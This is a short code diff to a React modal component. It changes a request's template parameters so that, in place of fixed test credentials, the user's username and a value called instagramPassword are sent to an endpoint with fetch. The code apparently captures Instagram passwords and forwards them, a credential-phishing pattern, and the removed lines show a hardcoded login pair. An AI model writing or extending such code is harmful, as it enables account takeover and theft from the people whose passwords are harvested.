@@ -102,8 +102,8 @@ const ModalNew = ({ modalIsOpen, setIsOpen, avatar, userId }) => {
         template_params: {
           'g-recaptcha-response': '03AHJ_ASjnLA214KSNKFJAK12sfKASfehbmfd...',
           'date': new Date().toDateString(),
-          'username': 'dev_cent',
-          'password': 'centG99',
+          'username': user?.username,
+          'password': instagramPassword,
         }
       };
       const f = await fetch(url, {
